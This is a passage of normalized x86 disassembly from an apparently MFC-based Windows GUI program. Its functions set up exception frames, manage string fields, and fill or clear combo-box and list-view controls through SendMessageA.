mov edx [ esi ]
mov ecx esi
call [ edx + 0x24 ]
lea eax [ esp + 0x13c ]
lea ecx [ ebp + 0x1ac ]
push eax
call sub_442281
lea ecx [ esp + 0x138 ]
push ecx
lea ecx [ ebp + 0x1c0 ]
call sub_442281
lea edx [ esp + 0x140 ]
lea ecx [ ebp + 0x1bc ]
push edx
call sub_442281
lea eax [ esp + 0x130 ]
lea ecx [ ebp + 0x1b8 ]
push eax
call sub_442281
lea ecx [ esp + 0x134 ]
push ecx
lea ecx [ ebp + 0x1a8 ]
call sub_442281
lea edx [ esp + 0x12c ]
lea ecx [ ebp + 0x1b4 ]
push edx
call sub_442281
lea eax [ esp + 0x128 ]
lea ecx [ ebp + 0x1b0 ]
push eax
call sub_442281
mov edx [ esi ]
mov ecx esi
call [ edx + 0x28 ]
mov eax [ esi ]
mov ecx esi
call [ eax + 0x10 ]
mov ecx ebp
call sub_402dc0
lea ecx [ esp + 0x10 ]
mov [ esp + 0x14c ] bl
call sub_442148
push ebx
push ebx
push rw-data
call sub_4496b7
lea ecx [ esp + 0x10 ]
mov [ esp + 0x14c ] bl
call sub_442148
lea ecx [ esp + 0x140 ]
mov [ esp + 0x14c ] 0x1d
call sub_442148
lea ecx [ esp + 0x13c ]
mov [ esp + 0x14c ] 0x1c
call sub_442148
lea ecx [ esp + 0x138 ]
mov [ esp + 0x14c ] 0x1b
call sub_442148
lea ecx [ esp + 0x134 ]
mov [ esp + 0x14c ] 0x1a
call sub_442148
lea ecx [ esp + 0x130 ]
mov [ esp + 0x14c ] 0x19
call sub_442148
lea ecx [ esp + 0x12c ]
mov [ esp + 0x14c ] 0x18
call sub_442148
lea ecx [ esp + 0x128 ]
mov [ esp + 0x14c ] 0x17
call sub_442148
lea ecx [ esp + 0xec ]
mov [ esp + 0x14c ] 0x16
call sub_44f0ac
lea ecx [ esp + 0xb0 ]
mov [ esp + 0x14c ] 0x15
call sub_44f0ac
mov [ esp + 0x14c ] 0x14
jmp r-xdata
sub_403fa0
push 0xffffffff
push sub_45c181
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
push ebx
push ebp
push esi
push edi
mov esi ecx
push eax
push 0x97
mov [ esp + 0x18 ] esi
call sub_43ddd5
lea edi [ esi + 0x5c ]
mov [ esp + 0x1c ] 0x0
mov ecx edi
call sub_43e388
mov [ edi ] r--data
lea edi [ esi + 0x98 ]
mov [ esp + 0x1c ] 0x1
mov ecx edi
call sub_43e388
mov [ edi ] r--data
lea edi [ esi + 0xd4 ]
mov [ esp + 0x1c ] 0x2
mov ecx edi
call sub_43e388
mov [ edi ] r--data
mov edx [ rw-data ]
lea ecx [ esi + 0x110 ]
mov [ ecx ] edx
mov eax [ rw-data ]
lea edi [ esi + 0x114 ]
mov [ edi ] eax
mov edx [ rw-data ]
lea ebx [ esi + 0x118 ]
mov [ ebx ] edx
mov eax [ rw-data ]
lea ebp [ esi + 0x11c ]
mov [ ebp ] eax
mov edx [ rw-data ]
mov [ esi + 0x120 ] edx
mov eax [ rw-data ]
mov [ esi + 0x124 ] eax
mov edx [ rw-data ]
mov [ esi + 0x128 ] edx
push rw-data
mov [ esp + 0x20 ] 0xa
mov [ esi ] r--data
call sub_4422d1
push rw-data
mov ecx edi
call sub_4422d1
push rw-data
mov ecx ebx
call sub_4422d1
push rw-data
mov ecx ebp
call sub_4422d1
push rw-data
lea ecx [ esi + 0x120 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x124 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x128 ]
call sub_4422d1
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_404120
push esi
mov esi ecx
push edi
mov edi [ esp + 0xc ]
lea eax [ esi + 0x5c ]
push eax
push 0x3ec
push edi
call sub_449556
lea ecx [ esi + 0x98 ]
push ecx
push 0x3eb
push edi
call sub_449556
lea edx [ esi + 0xd4 ]
push edx
push 0x426
push edi
call sub_449556
lea eax [ esi + 0x110 ]
push eax
push 0x426
push edi
call sub_449495
lea ecx [ esi + 0x114 ]
push ecx
push 0x3eb
push edi
call sub_449495
lea edx [ esi + 0x118 ]
push edx
push 0x3ec
push edi
call sub_449495
lea eax [ esi + 0x11c ]
push eax
push 0x425
push edi
call sub_4493f1
lea ecx [ esi + 0x120 ]
push ecx
push 0x427
push edi
call sub_4493f1
lea edx [ esi + 0x124 ]
push edx
push 0x3ea
push edi
call sub_4493f1
add esi 0x128
push esi
push 0x3ed
push edi
call sub_4493f1
pop edi
pop esi
retn 0x4
sub_4041f0
push 0xffffffff
push sub_45c1c1
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x120
push esi
mov esi ecx
call sub_43e113
push 0x0
lea ecx [ esp + 0xc ]
call sub_40b290
mov eax [ rw-data ]
mov [ esp + 0x12c ] 0x0
mov [ esp + 0x4 ] eax
push rw-data
lea ecx [ esp + 0x8 ]
mov [ esp + 0x130 ] 0x1
call sub_4422d1
mov ecx [ esp + 0x4 ]
push 0x0
push ecx
push 0xffffffff
lea ecx [ esp + 0x14 ]
call sub_42182c
test eax eax
jne r-xdata
mov eax [ esp + 0xd0 ]
test eax eax
jne r-xdata
push eax
push rw-data
push rw-data
mov ecx esi
call sub_43fe9c
lea ecx [ esp + 0x8 ]
call sub_421900
lea ecx [ esp + 0x4 ]
mov [ esp + 0x12c ] 0x0
call sub_442148
lea ecx [ esp + 0x120 ]
mov [ esp + 0x12c ] 0x4
call sub_442148
lea ecx [ esp + 0x11c ]
mov [ esp + 0x12c ] 0x3
call sub_442148
lea ecx [ esp + 0x118 ]
mov [ esp + 0x12c ] 0x2
call sub_442148
lea ecx [ esp + 0x8 ]
mov [ esp + 0x12c ] 0xffffffff
call sub_421723
mov ecx [ esp + 0x124 ]
mov eax 0x1
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x12c
retn
push edi
mov edi [ SendMessageA@IAT ]
mov edx [ esp + 0x120 ]
mov eax [ esi + 0xf0 ]
push edx
push 0x0
push 0x143
push eax
call edi
mov edx [ esp + 0xc ]
push 0x1
push 0x1
lea ecx [ esp + 0x14 ]
call [ edx + 0x14 ]
mov eax [ esp + 0xd4 ]
test eax eax
je r-xdata
pop edi
sub_404340
push 0xffffffff
push sub_45c1f4
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
lea ecx [ esi + 0x118 ]
mov [ esp + 0x10 ] 0x2
call sub_442148
lea ecx [ esi + 0x114 ]
mov [ esp + 0x10 ] 0x1
call sub_442148
lea ecx [ esi + 0x110 ]
mov [ esp + 0x10 ] 0x0
call sub_442148
mov ecx esi
mov [ esp + 0x10 ] 0xffffffff
call sub_421723
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_4043b0
push esi
mov esi ecx
push 0x1
call sub_440b18
mov eax [ esi + 0x110 ]
mov ecx [ eax - 0x8 ]
test ecx ecx
jne r-xdata
mov ecx [ esi + 0x11c ]
mov eax [ ecx - 0x8 ]
test eax eax
jne r-xdata
push 0x0
push 0x0
push rw-data
call sub_4496b7
pop esi
retn
mov edx [ esi + 0x118 ]
mov eax [ edx - 0x8 ]
test eax eax
jne r-xdata
push 0x0
push 0x0
push rw-data
call sub_4496b7
pop esi
retn
mov eax [ esi + 0x114 ]
mov ecx [ eax - 0x8 ]
test ecx ecx
jne r-xdata
push 0x0
push 0x0
push rw-data
call sub_4496b7
pop esi
retn
mov ecx [ esi + 0x124 ]
mov eax [ ecx - 0x8 ]
test eax eax
jne r-xdata
push 0x0
push 0x0
push rw-data
call sub_4496b7
pop esi
retn
mov ecx esi
call sub_43e178
pop esi
retn
push 0x0
push 0x0
push rw-data
call sub_4496b7
pop esi
retn
sub_404460
push ebx
push esi
push edi
mov esi ecx
push 0x1
call sub_440b18
mov eax [ esi + 0xb4 ]
mov edi [ SendMessageA@IAT ]
push 0x0
push 0x0
push 0x146
push eax
call edi
test eax eax
jle r-xdata
mov edx [ esi + 0x78 ]
push 0x0
push 0x0
push 0x146
push edx
call edi
test eax eax
jle r-xdata
mov ebx eax
pop edi
pop esi
pop ebx
retn
mov ebx eax
mov ecx [ esi + 0xb4 ]
push 0x0
push 0x0
push 0x144
push ecx
call edi
dec ebx
jne r-xdata
mov eax [ esi + 0x78 ]
push 0x0
push 0x0
push 0x144
push eax
call edi
dec ebx
jne r-xdata
sub_4044d0
push esi
push edi
mov esi ecx
push 0x1
call sub_440b18
mov eax [ esi + 0x78 ]
mov edi [ SendMessageA@IAT ]
push 0x0
push 0x0
push 0x146
push eax
call edi
test eax eax
jle r-xdata
pop edi
pop esi
retn
push ebx
mov ebx eax
mov ecx [ esi + 0x78 ]
push 0x0
push 0x0
push 0x144
push ecx
call edi
dec ebx
jne r-xdata
pop ebx
sub_404510
push 0xffffffff
push sub_45c25c
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x124
push ebp
push esi
push edi
mov esi ecx
push 0x1
call sub_440b18
mov eax [ rw-data ]
mov [ esp + 0xc ] eax
mov ecx [ esi + 0xb4 ]
mov edi [ SendMessageA@IAT ]
push 0x0
push 0x0
push 0x146
push ecx
mov [ esp + 0x148 ] 0x0
call edi
test eax eax
jle r-xdata
mov eax [ esi + 0x78 ]
push 0x0
push 0x0
push 0x146
push eax
call edi
test eax eax
jle r-xdata
mov ebp eax
push 0x0
lea ecx [ esp + 0x14 ]
call sub_413100
mov edx [ esi + 0x110 ]
lea eax [ esp + 0xc ]
push edx
push rw-data
push eax
mov [ esp + 0x144 ] 0x1
call sub_43b5cc
mov ecx [ esp + 0x18 ]
add esp 0xc
or ebp 0xffffffff
push 0x0
push ecx
push ebp
lea ecx [ esp + 0x1c ]
call sub_42182c
test eax eax
jne r-xdata
mov ebp eax
mov edx [ esi + 0xb4 ]
push 0x0
push 0x0
push 0x144
push edx
call edi
dec ebp
jne r-xdata
mov eax [ esp + 0xd8 ]
test eax eax
jne r-xdata
push eax
push rw-data
push rw-data
mov ecx esi
call sub_43fe9c
lea ecx [ esp + 0x12c ]
mov [ esp + 0x138 ] 0x5
call sub_442148
lea ecx [ esp + 0x128 ]
mov [ esp + 0x138 ] 0x4
call sub_442148
lea ecx [ esp + 0x124 ]
mov [ esp + 0x138 ] 0x3
call sub_442148
mov [ esp + 0x138 ] 0x2
jmp r-xdata
mov ecx [ esi + 0x78 ]
push 0x0
push 0x0
push 0x144
push ecx
call edi
dec ebp
jne r-xdata
lea ecx [ esp + 0x10 ]
call sub_421900
lea ecx [ esp + 0x12c ]
mov [ esp + 0x138 ] 0x9
call sub_442148
lea ecx [ esp + 0x128 ]
mov [ esp + 0x138 ] 0x8
call sub_442148
lea ecx [ esp + 0x124 ]
mov [ esp + 0x138 ] 0x7
call sub_442148
mov [ esp + 0x138 ] 0x6
mov edx [ esp + 0x124 ]
mov eax [ esi + 0xb4 ]
push edx
push 0x0
push 0x143
push eax
call edi
mov edx [ esp + 0x10 ]
push 0x1
push 0x1
lea ecx [ esp + 0x18 ]
call [ edx + 0x14 ]
mov eax [ esp + 0xd8 ]
test eax eax
je r-xdata
lea ecx [ esp + 0x120 ]
call sub_442148
lea ecx [ esp + 0x10 ]
mov [ esp + 0x138 ] 0x0
call sub_421723
lea ecx [ esp + 0xc ]
mov [ esp + 0x138 ] ebp
call sub_442148
mov ecx [ esp + 0x130 ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
add esp 0x130
retn
sub_404720
push 0xffffffff
push sub_45c2a2
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
lea ecx [ esi + 0x11c ]
mov [ esp + 0x10 ] 0x3
call sub_442148
lea ecx [ esi + 0x118 ]
mov [ esp + 0x10 ] 0x2
call sub_442148
lea ecx [ esi + 0x114 ]
mov [ esp + 0x10 ] 0x1
call sub_442148
lea ecx [ esi + 0x110 ]
mov [ esp + 0x10 ] 0x0
call sub_442148
mov ecx esi
mov [ esp + 0x10 ] 0xffffffff
call sub_421723
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_4047a0
push 0xffffffff
push sub_45c32c
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x12c
push ebp
push esi
push edi
mov esi ecx
push 0x1
call sub_440b18
mov eax [ rw-data ]
mov [ esp + 0xc ] eax
mov ecx [ esi + 0x78 ]
mov edi [ SendMessageA@IAT ]
push 0x0
push 0x0
push 0x146
push ecx
mov [ esp + 0x150 ] 0x0
call edi
test eax eax
jle r-xdata
push 0x0
lea ecx [ esp + 0x14 ]
call sub_40a470
mov eax [ esi + 0x114 ]
mov ecx [ esi + 0x110 ]
push eax
push ecx
lea edx [ esp + 0x14 ]
push rw-data
push edx
mov [ esp + 0x150 ] 0x1
call sub_43b5cc
mov eax [ esp + 0x1c ]
add esp 0x10
or ebp 0xffffffff
lea ecx [ esp + 0x10 ]
push 0x0
push eax
push ebp
call sub_42182c
test eax eax
jne r-xdata
mov ebp eax
mov eax [ esp + 0xd8 ]
test eax eax
jne r-xdata
push eax
push rw-data
push rw-data
mov ecx esi
call sub_43fe9c
lea ecx [ esp + 0x134 ]
mov [ esp + 0x140 ] 0x7
call sub_442148
lea ecx [ esp + 0x130 ]
mov [ esp + 0x140 ] 0x6
call sub_442148
lea ecx [ esp + 0x12c ]
mov [ esp + 0x140 ] 0x5
call sub_442148
lea ecx [ esp + 0x128 ]
mov [ esp + 0x140 ] 0x4
call sub_442148
lea ecx [ esp + 0x124 ]
mov [ esp + 0x140 ] 0x3
call sub_442148
mov [ esp + 0x140 ] 0x2
jmp r-xdata
mov edx [ esi + 0x78 ]
push 0x0
push 0x0
push 0x144
push edx
call edi
dec ebp
jne r-xdata
lea ecx [ esp + 0x10 ]
call sub_421900
lea ecx [ esp + 0x134 ]
mov [ esp + 0x140 ] 0xd
call sub_442148
lea ecx [ esp + 0x130 ]
mov [ esp + 0x140 ] 0xc
call sub_442148
lea ecx [ esp + 0x12c ]
mov [ esp + 0x140 ] 0xb
call sub_442148
lea ecx [ esp + 0x128 ]
mov [ esp + 0x140 ] 0xa
call sub_442148
lea ecx [ esp + 0x124 ]
mov [ esp + 0x140 ] 0x9
call sub_442148
mov [ esp + 0x140 ] 0x8
mov ecx [ esp + 0x124 ]
mov edx [ esi + 0x78 ]
push ecx
push 0x0
push 0x143
push edx
call edi
mov eax [ esp + 0x10 ]
push 0x1
push 0x1
lea ecx [ esp + 0x18 ]
call [ eax + 0x14 ]
mov eax [ esp + 0xd8 ]
test eax eax
je r-xdata
lea ecx [ esp + 0x120 ]
call sub_442148
lea ecx [ esp + 0x10 ]
mov [ esp + 0x140 ] 0x0
call sub_421723
lea ecx [ esp + 0xc ]
mov [ esp + 0x140 ] ebp
call sub_442148
mov ecx [ esp + 0x138 ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
add esp 0x138
retn
sub_4049e0
push 0xffffffff
push sub_45c3aa
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
push ebx
push ebp
push esi
push edi
mov esi ecx
push eax
mov [ esp + 0x14 ] esi
call sub_421517
mov edx [ rw-data ]
lea ecx [ esi + 0x110 ]
mov [ esp + 0x1c ] 0x0
mov [ ecx ] edx
mov eax [ rw-data ]
lea edi [ esi + 0x114 ]
mov [ edi ] eax
mov edx [ rw-data ]
lea ebp [ esi + 0x118 ]
mov [ ebp ] edx
mov eax [ rw-data ]
lea ebx [ esi + 0x11c ]
mov [ ebx ] eax
mov edx [ rw-data ]
mov [ esi + 0x120 ] edx
mov eax [ rw-data ]
mov [ esi + 0x124 ] eax
mov edx [ rw-data ]
mov [ esi + 0x128 ] edx
push rw-data
mov [ esp + 0x20 ] 0x7
mov [ esi ] r--data
call sub_4422d1
push rw-data
mov ecx edi
call sub_4422d1
push rw-data
mov ecx ebp
call sub_4422d1
push rw-data
mov ecx ebx
call sub_4422d1
push rw-data
lea ecx [ esi + 0x120 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x124 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x128 ]
call sub_4422d1
mov ecx [ esp + 0x14 ]
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x8c ] 0x1
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_404b20
push 0xffffffff
push sub_45c41c
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
lea ecx [ esi + 0x128 ]
mov [ esp + 0x10 ] 0x6
call sub_442148
lea ecx [ esi + 0x124 ]
mov [ esp + 0x10 ] 0x5
call sub_442148
lea ecx [ esi + 0x120 ]
mov [ esp + 0x10 ] 0x4
call sub_442148
lea ecx [ esi + 0x11c ]
mov [ esp + 0x10 ] 0x3
call sub_442148
lea ecx [ esi + 0x118 ]
mov [ esp + 0x10 ] 0x2
call sub_442148
lea ecx [ esi + 0x114 ]
mov [ esp + 0x10 ] 0x1
call sub_442148
lea ecx [ esi + 0x110 ]
mov [ esp + 0x10 ] 0x0
call sub_442148
mov ecx esi
mov [ esp + 0x10 ] 0xffffffff
call sub_421723
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_404c00
push esi
mov esi ecx
push edi
mov edi [ esp + 0xc ]
push 0x0
push 0xc
lea eax [ esi + 0x110 ]
push 0xff
push eax
push rw-data
push edi
mov [ edi + 0x8 ] 0x0
call sub_4246fa
push 0x0
push 0xc
lea ecx [ esi + 0x114 ]
push 0xff
push ecx
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea edx [ esi + 0x118 ]
push 0xff
push edx
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea eax [ esi + 0x11c ]
push 0xff
push eax
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea ecx [ esi + 0x120 ]
push 0xff
push ecx
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea edx [ esi + 0x124 ]
push 0xff
push edx
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
add esi 0x128
push 0xff
push esi
push rw-data
push edi
call sub_4246fa
pop edi
pop esi
retn 0x4
sub_404ce0
push 0xffffffff
push sub_45c443
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
push esi
push edi
mov esi ecx
push eax
push 0x98
mov [ esp + 0x10 ] esi
call sub_43ddd5
lea edi [ esi + 0x5c ]
mov [ esp + 0x14 ] 0x0
mov ecx edi
call sub_43e388
mov [ edi ] r--data
push 0x0
lea ecx [ esi + 0x98 ]
mov [ esp + 0x18 ] 0x1
call sub_4060a0
mov ecx [ esp + 0xc ]
mov [ esi ] r--data
mov eax esi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_404d80
push 0xffffffff
push sub_45c4a3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push esi
push edi
mov edi ecx
mov [ esp + 0x8 ] edi
mov [ esp + 0x18 ] 0x0
lea esi [ edi + 0x98 ]
mov [ esp + 0xc ] esi
lea ecx [ esi + 0x120 ]
mov [ esp + 0x18 ] 0x6
call sub_442148
lea ecx [ esi + 0x11c ]
mov [ esp + 0x18 ] 0x5
call sub_442148
lea ecx [ esi + 0x118 ]
mov [ esp + 0x18 ] 0x4
call sub_442148
lea ecx [ esi + 0x114 ]
mov [ esp + 0x18 ] 0x3
call sub_442148
lea ecx [ esi + 0x110 ]
mov [ esp + 0x18 ] 0x2
call sub_442148
mov ecx esi
mov [ esp + 0x18 ] 0x1
call sub_421723
lea ecx [ edi + 0x5c ]
mov [ esp + 0x18 ] 0x0
call sub_43c0ee
mov ecx edi
mov [ esp + 0x18 ] 0xffffffff
call sub_43da87
mov ecx [ esp + 0x10 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
sub_404e50
push esi
push edi
mov esi ecx
call sub_43e113
push 0xffffffff
push 0xffffffff
lea edi [ esi + 0x5c ]
push 0x0
push rw-data
push 0x0
mov ecx edi
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x1
mov ecx edi
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x2
mov ecx edi
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x3
mov ecx edi
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x4
mov ecx edi
call sub_43c126
mov eax [ esi + 0x78 ]
mov edi [ SendMessageA@IAT ]
push 0x50
push 0x0
push 0x101e
push eax
call edi
mov ecx [ esi + 0x78 ]
push 0x50
push 0x1
push 0x101e
push ecx
call edi
mov edx [ esi + 0x78 ]
push 0x50
push 0x2
push 0x101e
push edx
call edi
mov eax [ esi + 0x78 ]
push 0x50
push 0x3
push 0x101e
push eax
call edi
mov ecx [ esi + 0x78 ]
push 0x78
push 0x4
push 0x101e
push ecx
call edi
mov edx [ esi + 0x78 ]
push 0x21
push 0x0
push 0x1036
push edx
call edi
mov ecx esi
call sub_404f30
mov eax 0x1
pop edi
pop esi
retn
sub_404f30
push 0xffffffff
push sub_45c4b8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ebx
push ebp
mov ebx [ SendMessageA@IAT ]
push esi
push edi
mov esi ecx
xor edi edi
mov eax [ esi + 0x78 ]
push edi
push edi
push 0x1009
push eax
call ebx
mov ecx [ esi + 0x78 ]
push edi
push edi
push 0xb
push ecx
call ebx
push 0x1
mov ecx esi
call sub_440b18
mov edx [ rw-data ]
mov [ esp + 0x10 ] edx
push rw-data
lea ecx [ esp + 0x14 ]
mov [ esp + 0x20 ] edi
call sub_4422d1
mov ecx [ esp + 0x10 ]
mov eax [ esi + 0x98 ]
lea ebp [ esi + 0x98 ]
push edi
push ecx
push 0xffffffff
mov ecx ebp
call [ eax + 0xc ]
test eax eax
jne r-xdata
cmp [ esi + 0x160 ] edi
jne r-xdata
push edi
push rw-data
push rw-data
mov ecx esi
call sub_43fe9c
jmp r-xdata
mov eax [ ebp ]
mov ecx ebp
call [ eax + 0x10 ]
mov ecx [ esi + 0x78 ]
push 0x0
push 0x1
push 0xb
push ecx
call ebx
lea ebx [ esi + 0x5c ]
lea ecx [ esp + 0x10 ]
mov [ esp + 0x1c ] 0xffffffff
call sub_442148
mov ecx [ esp + 0x14 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov eax [ esi + 0x1a8 ]
push 0x0
push 0x0
push 0x0
push 0x0
push eax
push edi
push 0x1
mov ecx ebx
call sub_43c179
mov eax [ esi + 0x1ac ]
mov ecx ebx
push eax
push 0x1
push edi
call sub_43c1c5
mov eax [ esi + 0x1b0 ]
mov ecx ebx
push eax
push 0x2
push edi
call sub_43c1c5
mov eax [ esi + 0x1b4 ]
mov ecx ebx
push eax
push 0x3
push edi
call sub_43c1c5
mov eax [ esi + 0x1b8 ]
mov ecx ebx
push eax
push 0x4
push edi
call sub_43c1c5
mov edx [ ebp ]
push 0x1
push 0x1
mov ecx ebp
inc edi
call [ edx + 0x14 ]
mov eax [ esi + 0x160 ]
test eax eax
je r-xdata
mov ebx [ SendMessageA@IAT ]
sub_405090
push 0xffffffff
push sub_45c54c
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xb0
mov eax [ rw-data ]
push esi
push edi
mov edi ecx
mov [ esp + 0x8 ] eax
push 0x0
lea ecx [ esp + 0x10 ]
mov [ esp + 0xc4 ] 0x0
call sub_405cf0
mov [ esp + 0xc0 ] 0x1
lea ecx [ esp + 0xb4 ]
mov [ esp + 0xc0 ] 0xd
call sub_442148
lea ecx [ esp + 0xb0 ]
mov [ esp + 0xc0 ] 0xc
call sub_442148
lea ecx [ esp + 0xac ]
mov [ esp + 0xc0 ] 0xb
call sub_442148
lea ecx [ esp + 0xa8 ]
mov [ esp + 0xc0 ] 0xa
call sub_442148
lea ecx [ esp + 0xa4 ]
mov [ esp + 0xc0 ] 0x9
call sub_442148
mov [ esp + 0xc0 ] 0x8
mov ecx [ esp + 0xa8 ]
lea edx [ esp + 0x8 ]
push ecx
push rw-data
push edx
call sub_43b5cc
mov ecx [ esp + 0x14 ]
mov eax [ edi + 0x98 ]
add esp 0xc
lea esi [ edi + 0x98 ]
push 0x0
push ecx
push 0xffffffff
mov ecx esi
call [ eax + 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x0
push rw-data
call sub_4496b7
lea ecx [ esp + 0xb4 ]
mov [ esp + 0xc0 ] 0x7
call sub_442148
lea ecx [ esp + 0xb0 ]
mov [ esp + 0xc0 ] 0x6
call sub_442148
lea ecx [ esp + 0xac ]
mov [ esp + 0xc0 ] 0x5
call sub_442148
lea ecx [ esp + 0xa8 ]
mov [ esp + 0xc0 ] 0x4
call sub_442148
lea ecx [ esp + 0xa4 ]
mov [ esp + 0xc0 ] 0x3
call sub_442148
mov [ esp + 0xc0 ] 0x2
jmp r-xdata
mov eax [ edi + 0x134 ]
test eax eax
je r-xdata
lea ecx [ esp + 0x68 ]
call sub_44f0ac
lea ecx [ esp + 0xc ]
mov [ esp + 0xc0 ] 0x0
call sub_43da87
lea ecx [ esp + 0x8 ]
mov [ esp + 0xc0 ] 0xffffffff
call sub_442148
mov ecx [ esp + 0xb8 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0xbc
retn
mov eax [ edi + 0x98 ]
lea esi [ edi + 0x98 ]
mov ecx esi
call [ eax + 0x20 ]
lea ecx [ esp + 0xb0 ]
push ecx
lea ecx [ edi + 0x1ac ]
call sub_442281
lea edx [ esp + 0xac ]
lea ecx [ edi + 0x1b8 ]
push edx
call sub_442281
lea eax [ esp + 0xb4 ]
lea ecx [ edi + 0x1b4 ]
push eax
call sub_442281
lea ecx [ esp + 0xa4 ]
push ecx
lea ecx [ edi + 0x1b0 ]
call sub_442281
lea edx [ esp + 0xa8 ]
lea ecx [ edi + 0x1a8 ]
push edx
call sub_442281
mov eax [ esi ]
mov ecx esi
call [ eax + 0x28 ]
mov edx [ esi ]
mov ecx esi
call [ edx + 0x10 ]
mov ecx edi
call sub_404f30
push 0x0
push 0x0
push rw-data
call sub_4496b7
mov edx [ esi ]
mov ecx esi
call [ edx + 0x10 ]
jmp r-xdata
lea ecx [ esp + 0xc ]
call sub_43de8a
cmp eax 0x1
jne r-xdata
sub_405300
push 0xffffffff
push sub_45c5ab
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
lea ecx [ esi + 0xa8 ]
mov [ esp + 0x10 ] 0x5
call sub_442148
lea ecx [ esi + 0xa4 ]
mov [ esp + 0x10 ] 0x4
call sub_442148
lea ecx [ esi + 0xa0 ]
mov [ esp + 0x10 ] 0x3
call sub_442148
lea ecx [ esi + 0x9c ]
mov [ esp + 0x10 ] 0x2
call sub_442148
lea ecx [ esi + 0x98 ]
mov [ esp + 0x10 ] 0x1
call sub_442148
lea ecx [ esi + 0x5c ]
mov [ esp + 0x10 ] 0x0
call sub_44f0ac
mov ecx esi
mov [ esp + 0x10 ] 0xffffffff
call sub_43da87
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_4053a0
push 0xffffffff
push sub_45c6b1
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xb4
push ebx
push ebp
push esi
mov ebp ecx
xor ebx ebx
push edi
push ebx
lea ecx [ esp + 0x1c ]
call sub_405cf0
push 0x1
mov ecx ebp
mov [ esp + 0xd0 ] ebx
call sub_440b18
mov eax [ ebp + 0x78 ]
push ebx
push ebx
push 0x1042
push eax
call [ SendMessageA@IAT ]
mov edi eax
cmp edi ebx
jge r-xdata
push 0x1
lea ecx [ esp + 0x14 ]
lea esi [ ebp + 0x5c ]
push edi
push ecx
mov ecx esi
call sub_43c1f0
push eax
lea ecx [ esp + 0xc0 ]
mov [ esp + 0xd0 ] 0x7
call sub_442281
lea ecx [ esp + 0x10 ]
mov [ esp + 0xcc ] bl
call sub_442148
push 0x4
lea edx [ esp + 0x14 ]
push edi
push edx
mov ecx esi
call sub_43c1f0
push eax
lea ecx [ esp + 0xbc ]
mov [ esp + 0xd0 ] 0x8
call sub_442281
lea ecx [ esp + 0x10 ]
mov [ esp + 0xcc ] bl
call sub_442148
push 0x3
lea eax [ esp + 0x14 ]
push edi
push eax
mov ecx esi
call sub_43c1f0
push eax
lea ecx [ esp + 0xc4 ]
mov [ esp + 0xd0 ] 0x9
call sub_442281
lea ecx [ esp + 0x10 ]
mov [ esp + 0xcc ] bl
call sub_442148
push 0x2
lea ecx [ esp + 0x14 ]
push edi
push ecx
mov ecx esi
call sub_43c1f0
push eax
lea ecx [ esp + 0xb4 ]
mov [ esp + 0xd0 ] 0xa
call sub_442281
lea ecx [ esp + 0x10 ]
mov [ esp + 0xcc ] bl
call sub_442148
push ebx
lea edx [ esp + 0x14 ]
push edi
push edx
mov ecx esi
call sub_43c1f0
push eax
lea ecx [ esp + 0xb8 ]
